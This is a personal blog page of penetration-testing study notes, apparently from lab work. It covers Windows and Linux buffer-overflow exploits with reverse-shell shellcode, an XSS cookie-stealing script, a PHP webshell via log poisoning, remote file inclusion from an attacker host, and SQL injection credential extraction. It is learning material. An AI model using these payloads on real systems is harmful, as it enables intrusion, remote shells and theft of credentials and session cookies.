<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="No Description"><meta name="keywords" content=""><meta name="author" content="Gavin Cui"><meta name="copyright" content="Gavin Cui"><title>No Subtitle | Gavin's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.9.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.9.0"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css?version=1.9.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  hexoVersion: '5.4.0'
} </script><meta name="generator" content="Hexo 5.4.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="false"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Gavin Cui</div><div class="author-info__description text-center">No Description</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">12</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">5</span></a></div></div></div><nav class="no-bg" id="nav"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Gavin's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a></span><span class="pull-right"></span></div><div id="site-info"><div id="site-title">Gavin's Blog</div><div id="site-sub-title">No Subtitle</div><div id="site-social-icons"><a class="social-icon" href="https://github.com/Gavincrz" target="_blank" rel="noreferrer noopener nofollow"><i class="fa-github-square fab"></i></a></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/20/Study-Notes-2021-03-20/">Study Notes - 2021/03/20</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-20</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Linux-Buffer-Overflow"><a href="#Linux-Buffer-Overflow" class="headerlink" title="Linux Buffer Overflow"></a>Linux Buffer Overflow</h1><h2 id="DEP-data-execution-prevention-ASLR-Canaries"><a href="#DEP-data-execution-prevention-ASLR-Canaries" class="headerlink" title="DEP (data execution prevention), ASLR, Canaries"></a>DEP (data execution prevention), ASLR, Canaries</h2><h1 id="replicating-the-crash"><a href="#replicating-the-crash" class="headerlink" title="replicating the crash"></a>replicating the crash</h1><h1 id="controlling-EIP"><a href="#controlling-EIP" class="headerlink" title="controlling EIP"></a>controlling EIP</h1><h2 id="find-the-eip-location-use-msf-pattern-create"><a href="#find-the-eip-location-use-msf-pattern-create" class="headerlink" title="find the eip location, use msf-pattern_create"></a>find the eip location, use msf-pattern_create</h2><p><code>msf-pattern_create -l 4379</code><br>eip = 0x46367046<br><code>msf-pattern_offset -q 46367046</code><br>-q, –query Aa0A                 Query to Locate  </p>
<p>offset = 4368</p>
<p>crash = “\x41” * 4368 + “B” * 4 + “C” * 7  </p>
<h2 id="locating-space-for-shell-code"><a href="#locating-space-for-shell-code" class="headerlink" title="locating space for shell code"></a>locating space for shell code</h2><p>find a register that point to our buffer:<br>esp point to the end of our buffer, only have 7 bytes remaining in the buffer, increase buffer size not work, lead to another crash<br>eax point to the start of the buffer, including the “setup sound” string </p>
<p>right click -&gt; go to expression (setup sound)<br>“se” -&gt;  translate to <code>jae</code> jump short if above or equal<br>“tu” -&gt;  <code>je</code> jump if equal<br>not good  </p>
<p>insert first stage shell code at the 7 bytes space<br>use to allain eax to point to string after setup sound, then jump to there </p>
<p>increase eax+12 as there are 12 chars in “setup sound”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ msf-nasm_shell</span><br><span class="line">nasm &gt; add eax,12</span><br><span class="line">00000000 83C00C add eax,byte +0xc</span><br><span class="line">nasm &gt; jmp eax</span><br><span class="line">00000000 FFE0 jmp eax</span><br></pre></td></tr></table></figure>

<p>5 bytes instructions 83C00C FFE0</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">padding &#x3D; &quot;\x41&quot; * 4368</span><br><span class="line">eip &#x3D; &quot;\x42\x42\x42\x42&quot;</span><br><span class="line">first_stage &#x3D; &quot;\x83\xc0\x0c\xff\xe0\x90\x90&quot;  # padding with nops</span><br><span class="line"></span><br><span class="line">buffer &#x3D; &quot;\x11(setup sound &quot; + padding + eip + first_stage + &quot;\x90\x00#&quot;</span><br></pre></td></tr></table></figure>


<h2 id="checking-for-bad-chars"><a href="#checking-for-bad-chars" class="headerlink" title="checking for bad chars"></a>checking for bad chars</h2><p>We sent the whole range of characters from 00 to FF within our buffer and then monitored<br>whether any of those bytes got mangled, swapped, dropped, or changed in memory once they<br>were processed by the application.</p>
<p>0x00 0x20  </p>
<h2 id="finding-a-return-address"><a href="#finding-a-return-address" class="headerlink" title="finding a return address"></a>finding a return address</h2><p>edb Plugins -&gt; OpcodeSearcher<br>0x8134596  </p>
<h2 id="getting-a-shell"><a href="#getting-a-shell" class="headerlink" title="getting a shell"></a>getting a shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.119.148 LPORT&#x3D;443 -b &quot;\x00\x20&quot; -f py -v shellcode</span><br></pre></td></tr></table></figure>

<p>the output format with<br>-f, and the variable name to use with -v.  </p>
<p>shell is stucked, because of debugger</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/16/Study-Notes-2021-03-17/">Study Notes - 2021/03/17</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-16</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Buffer-Overflow"><a href="#Buffer-Overflow" class="headerlink" title="Buffer Overflow"></a>Buffer Overflow</h1><h1 id="Immunity-Debug"><a href="#Immunity-Debug" class="headerlink" title="Immunity Debug"></a>Immunity Debug</h1><p>F2 set break point<br>F9 to run the program<br>F7 step into the function<br>Ctrl + F9 execute until the return of the function  </p>
<h1 id="Windows-Buffer-Overflows"><a href="#Windows-Buffer-Overflows" class="headerlink" title="Windows Buffer Overflows"></a>Windows Buffer Overflows</h1><h2 id="Discover-the-vulnerability"><a href="#Discover-the-vulnerability" class="headerlink" title="Discover the vulnerability"></a>Discover the vulnerability</h2><ol>
<li>source code review</li>
<li>reverse engineering </li>
<li>fuzzing  </li>
</ol>
<h1 id="Fuzzing-the-http-protocal"><a href="#Fuzzing-the-http-protocal" class="headerlink" title="Fuzzing the http protocal"></a>Fuzzing the http protocal</h1><h2 id="get-seed"><a href="#get-seed" class="headerlink" title="get seed"></a>get seed</h2><p>use wireshark to capture packages<br>capture filter <code>host 192.168.119.148 and host 192.168.148.10</code><br>locate the /login page and right click <code>follow tcp stream</code>  – apply display filters  </p>
<p>TCP View Stored at: <code>C:\Tools\windows_buffer_overflows</code>  find the process listening on port 80<br>Run Immunity Debug with admin  </p>
<h2 id="Replicate-the-crash"><a href="#Replicate-the-crash" class="headerlink" title="Replicate the crash"></a>Replicate the crash</h2><h2 id="Control-EIP"><a href="#Control-EIP" class="headerlink" title="Control EIP"></a>Control EIP</h2><h3 id="Binary-Search"><a href="#Binary-Search" class="headerlink" title="Binary Search"></a>Binary Search</h3><p>AAAABBBB, then AAAABBCC then AAAABBCD until locate the eip  </p>
<p>generate non-repeat pattern<br><code>msf-pattern_create -l 800</code>  </p>
<p>eip replaced with <code>42306142</code>  -&gt; <code>B0aB</code>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ msf-pattern_offset -l 800 -q 42306142                                                                          </span><br><span class="line">[*] Exact match at offset 780</span><br></pre></td></tr></table></figure>

<h2 id="Locating-space-for-shell-code"><a href="#Locating-space-for-shell-code" class="headerlink" title="Locating space for shell code"></a>Locating space for shell code</h2><p>usually shell code length 350 - 400 bytes<br>esp locate at BBBBCCCCESP!  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">filler &#x3D; &quot;A&quot; * 780</span><br><span class="line">eip &#x3D; &quot;B&quot; * 4</span><br><span class="line">offset &#x3D; &quot;C&quot; * 4</span><br><span class="line">buffer &#x3D; &quot;D&quot; * (1500 - len(filler) - len(eip) - len(offset))</span><br><span class="line">inputBuffer &#x3D; filler + eip + offset + buffer</span><br><span class="line">&#96;&#96;&#96;  </span><br><span class="line">esp point to buffer  </span><br><span class="line"></span><br><span class="line">## checking for bad chars</span><br><span class="line">&#96;0x00&#96;  use to terminate string  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>badchars = (<br>“\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10”<br>“\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20”<br>“\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30”<br>“\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40”<br>“\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50”<br>“\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60”<br>“\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70”<br>“\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80”<br>“\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90”<br>“\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0”<br>“\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0”<br>“\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0”<br>“\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0”<br>“\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0”<br>“\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0”<br>“\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff” )</p>
<p>inputBuffer = filler + eip + offset + badchars</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">right click esp, follow in dump: find that char after 0x09 not appear  means 0x0a is a bad char (line feed, terminate the http field)  </span><br><span class="line"></span><br><span class="line">remove 0x0a from the barchar and repeat, find 0x0d (return char) is also bad  </span><br><span class="line">all bad char &#96;0x00, 0x0A, 0x0D, 0x25, 0x26, 0x2B 0x3D&#96;   </span><br><span class="line"></span><br><span class="line">## redirecting the execution flow</span><br><span class="line">the address differ from crash to crash  </span><br><span class="line">## find return address  </span><br><span class="line">JMP ESP  </span><br><span class="line">the addresses used in the library must be static, eliminates libraries compiled with ASLR support </span><br><span class="line">the **address** can not contain any bar char  </span><br><span class="line"></span><br><span class="line">use !mona modules</span><br></pre></td></tr></table></figure>
<p>Log data, item 7<br> Address=0BADF00D<br> Message= 0x00400000 | 0x00462000 | 0x00062000 | False  | False   | False |  False   | False  | -1.0- [syncbrs.exe] (C:\Program Files\Sync Breeze Enterprise\bin\syncbrs.exe)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">however the address leading with &#96;0x00&#96;  </span><br></pre></td></tr></table></figure>
<p>Log data, item 10<br> Address=0BADF00D<br> Message= 0x10000000 | 0x10223000 | 0x00223000 | False  | False   | False |  False   | False  | -1.0- [libspp.dll] (C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tip: If this application was compiled with DEP support, our JMP ESP</span><br><span class="line">address would have to be located in the .text code segment of the module  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>kali@kali:~$ msf-nasm_shell<br>nasm &gt; jmp esp<br>00000000 FFE4 jmp esp<br>nasm &gt;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;!mona find -s &quot;\xff\xe4&quot; -m &quot;libspp.dll&quot;&#96;  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Log data, item 3<br> Address=10090C83<br> Message=  0x10090c83 : “\xff\xe4” |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">JMP ESP instruction (0x10090c83)  </span><br><span class="line">eip &#x3D; &quot;\x83\x0c\x09\x10&quot;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## generate shell code with metasploit  </span><br><span class="line">&#96;msfvenom -l payloads&#96;  list available playload  </span><br><span class="line">&#96;msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.119.148 LPORT&#x3D;443 -f c&#96;  </span><br><span class="line">-p payload  </span><br><span class="line">-f to select C-formatted shellcode.  </span><br></pre></td></tr></table></figure>
<p>└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.148 LPORT=443 -f c<br>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br>[-] No arch selected, selecting arch: x86 from the payload<br>No encoder specified, outputting raw payload<br>Payload size: 324 bytes<br>Final size of c file: 1386 bytes<br>unsigned char buf[] =<br>“\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30”<br>“\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff”<br>“\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52”<br>“\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1”<br>“\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b”<br>“\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03”<br>“\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b”<br>“\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24”<br>“\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb”<br>“\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c”<br>“\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68”<br>“\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68”<br>“\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x77\x94\x68”<br>“\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61”<br>“\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2”<br>“\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6”<br>“\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44”<br>“\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56”<br>“\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff”<br>“\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6”<br>“\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb”<br>“\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5”;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include bad chars  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.148 LPORT=443 -f c –e x86/shikata_ga_nai -b “\x00\x0a\x0d\x25\x26\x2b\x3d”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-b bad char  </span><br><span class="line">-e encoder  </span><br><span class="line"></span><br><span class="line">the decoder (getPC routine) in the shell code modify the stack thus modify the decoder code it self.  </span><br><span class="line"></span><br><span class="line">create landing path, add many nops (\x90) </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>nops = “\x90” * 10<br>inputBuffer = filler + eip + offset + nops + shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>sudo nc -lnvp 443  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Yeah!!  </span><br><span class="line"></span><br><span class="line">But when we exit the shell, the sync breeze crash and exit  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## improving the exploit  </span><br><span class="line">Using ExitThread instead of ExitProcess</span><br></pre></td></tr></table></figure>
<p>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.148 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b “\x00\x0a\x0d\x25\x26\x2b\x3d”</p>
<pre><code>
</code></pre>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/16/Study-Notes-2021-03-16/">Study Notes - 2021/03/16</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-16</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><p>Use phpmyadmin to execute arbitrary sql  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from webappdb.users;</span><br><span class="line">insert into webappdb.users(password, username) VALUES (&quot;backdoor&quot;,&quot;backdoor&quot;);</span><br></pre></td></tr></table></figure>


<h1 id="Cross-Site-Scripting-XSS"><a href="#Cross-Site-Scripting-XSS" class="headerlink" title="Cross-Site Scripting (XSS)"></a>Cross-Site Scripting (XSS)</h1><p>Once we identify an entry point, we can input special characters, and observe the output to see if any of the special characters return unfiltered.</p>
<h1 id="Content-Injection"><a href="#Content-Injection" class="headerlink" title="Content Injection"></a>Content Injection</h1><p>injsect invisible iframe <code>&lt;iframe src=http://192.168.119.148/report height=”0” width=”0”&gt;&lt;/iframe&gt;</code><br>Open listern on attack machine <code>sudo nc -nvlp 80</code><br>can redirect to information gathering script  </p>
<h1 id="Steal-cokie-and-session-information"><a href="#Steal-cokie-and-session-information" class="headerlink" title="Steal cokie and session information"></a>Steal cokie and session information</h1><script>new Image().src="http://192.168.119.148/cool.jpg?output="+document.cookie;</script>

<h1 id="Directory-Traversal-Vulnerabilities"><a href="#Directory-Traversal-Vulnerabilities" class="headerlink" title="Directory Traversal Vulnerabilities"></a>Directory Traversal Vulnerabilities</h1><h2 id="Identify"><a href="#Identify" class="headerlink" title="Identify"></a>Identify</h2><p>find any parameter in the url that looks like a file name<br>e.g. <code>http://192.168.148.10/menu.php?file=current_menu.php</code><br>modify the file to reference files that should be readable by any user on the system, such as<br>/etc/passwd on Linux or c:\boot.ini on Windows  <code>c:\windows\system32\drivers\etc\hosts</code>  </p>
<h1 id="File-inclusion-Vulnerabilities"><a href="#File-inclusion-Vulnerabilities" class="headerlink" title="File inclusion Vulnerabilities"></a>File inclusion Vulnerabilities</h1><p>included file will be executed. </p>
<h2 id="local-file-inclusion-remote-file-inclusion"><a href="#local-file-inclusion-remote-file-inclusion" class="headerlink" title="local file inclusion/remote file inclusion"></a>local file inclusion/remote file inclusion</h2><p>different from where the file included from<br>We must locate<br>parameters we can manipulate and attempt to use them to load arbitrary files. However, a file inclusion takes this one step further, as we attempt execute the contents of the file within the application.  </p>
<h2 id="Contaminating-Log-Files"><a href="#Contaminating-Log-Files" class="headerlink" title="Contaminating Log Files"></a>Contaminating Log Files</h2><p>clear log<br>connect the servier with <code>&lt;?php echo &#39;&lt;pre&gt;&#39; . shell_exec($_GET[&#39;cmd&#39;]) . &#39;&lt;/pre&gt;&#39;;?&gt;</code><br>This output is first wrapped in pre HTML tags, which preserve any line breaks or formatting in the results of the function call.<br>inserted into the access log of apache:<br><code>192.168.119.148 - - [16/Mar/2021:18:18:11 -0700] &quot;&lt;?php echo &#39;&lt;pre&gt;&#39; . shell_exec($_GET[&#39;cmd&#39;]) . &#39;&lt;/pre&gt;&#39;;?&gt;\n&quot; 400 980 &quot;-&quot; &quot;-&quot;</code>  </p>
<p>access the file inclusion url <code>http://192.168.148.10/menu.php?file=c:\xampp\apache\logs\access.log&amp;cmd=ipconfig</code>  </p>
<h2 id="Remote-file-inclusion"><a href="#Remote-file-inclusion" class="headerlink" title="Remote file inclusion"></a>Remote file inclusion</h2><p>Remote file inclusion (RFI) vulnerabilities are less common than LFIs since the server must be configured in a very specific way, but they are usually easier to exploit. For example, PHP apps must be configured with allow_url_include set to “On”.  </p>
<p><code>http://192.168.148.10/menu.php?file=http://192.168.119.148/evil.txt&amp;cmd=ipconfig</code><br>host the file by setup a apache server  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo vi &#x2F;var&#x2F;www&#x2F;html&#x2F;evil.txt</span><br><span class="line">sudo systemctl start apache2</span><br><span class="line"></span><br><span class="line">or </span><br><span class="line"></span><br><span class="line">sudo python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p><code>/usr/share/webshells</code>  </p>
<h2 id="Expanding-Your-Repertoire"><a href="#Expanding-Your-Repertoire" class="headerlink" title="Expanding Your Repertoire"></a>Expanding Your Repertoire</h2><p>open a http server on current workign path</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 2334</span><br><span class="line">python3 -m http.server 7331</span><br><span class="line">php -S 0.0.0.0:8000</span><br><span class="line">ruby -run -e httpd . -p 9000</span><br><span class="line">busybox httpd -f -p 10000</span><br></pre></td></tr></table></figure>

<h2 id="PHP-Wrappers"><a href="#PHP-Wrappers" class="headerlink" title="PHP Wrappers"></a>PHP Wrappers</h2><p>when cannot poison local files<br><code>menu.php?file=data:text/plain,hello world</code><br>treat the data wrapper as a file<br><code>menu.php?file=data:text/plain,&lt;?php echo shell_exec(&quot;dir&quot;) ?&gt;</code>  </p>
<h1 id="SQL-injection"><a href="#SQL-injection" class="headerlink" title="SQL injection"></a>SQL injection</h1><h2 id="Discover-SQL-Injection-Vulnerabilities"><a href="#Discover-SQL-Injection-Vulnerabilities" class="headerlink" title="Discover SQL Injection Vulnerabilities"></a>Discover SQL Injection Vulnerabilities</h2><p>Common statement in sql;<br><code>$query = &quot;select * from users where username = &#39;$user&#39; and password = &#39;$pass&#39;&quot;;</code>  </p>
<h2 id="Authentication-Bypass"><a href="#Authentication-Bypass" class="headerlink" title="Authentication Bypass"></a>Authentication Bypass</h2><p><code>tom&#39; or 1=1;#</code>  <code>#</code> is comment in mysql and mariadb<br>Some web application expect the number of returned rows is 1  add LIMIT 1 <code>tom&#39; or 1=1 LIMIT 1;#</code>  </p>
<h2 id="Enumerating-the-database"><a href="#Enumerating-the-database" class="headerlink" title="Enumerating the database"></a>Enumerating the database</h2><p><code>http://192.168.148.10/debug.php?id=&#39;</code>  </p>
<h3 id="Column-number-enueration"><a href="#Column-number-enueration" class="headerlink" title="Column number enueration"></a>Column number enueration</h3><p><code>http://192.168.148.10/debug.php?id=1 order by 1</code><br>Use burpsuit repeater tool<br>results cotain 3 colums</p>
<h2 id="extra-further-data-with-union-statement"><a href="#extra-further-data-with-union-statement" class="headerlink" title="extra further data with union statement"></a>extra further data with union statement</h2><p>decide which colum is displayed<br><code>192.168.148.10/debug.php?id=1 union all select 1,2,3</code>  </p>
<p><strong>Union all allow duplicate values</strong>  </p>
<p>colum 2,3 get displayed<br>extract database verison: (depend on database engine, MariaDB use @@version)<br><code>http://192.168.148.10/debug.php?id=1 union all select 1, 2, @@version</code>  -&gt;  10.1.31-MariaDB<br>extract current database user<br><code>http://192.168.148.10/debug.php?id=1 union all select 1, 2, user() </code>  -&gt; root@localhost  </p>
<p>We can enumerate database tables and column structures through the information_schema.<br>The information schema stores information about the database, like table and column names.<br>We can use it to get the layout of the database so that we can craft better payloads to extract<br>sensitive data. The query for this would look similar to the following:<br><code>http://192.168.148.10/debug.php?id=1 union all select 1, 2, table_name from information_schema.tables</code>  </p>
<p>retrieve column name of user table:<br><code>http://192.168.148.10/debug.php?id=1 union all select 1, 2, column_name from information_schema.columns where table_name=&#39;users&#39;</code></p>
<p>extra user name and password:<br><code>http://192.168.148.10/debug.php?id=1 union all select 1, username, password from users</code></p>
<h2 id="From-sql-injection-to-code-execution"><a href="#From-sql-injection-to-code-execution" class="headerlink" title="From sql injection to code execution"></a>From sql injection to code execution</h2><p><code>http://192.168.148.10/debug.php?id=1 union all select 1, 2, load_file(&#39;C:/Windows/System32/drivers/etc/hosts&#39;)</code></p>
<p>into outfile:<br>from the error message, we know the location of webserver root: c:\xampp\htdocs  </p>
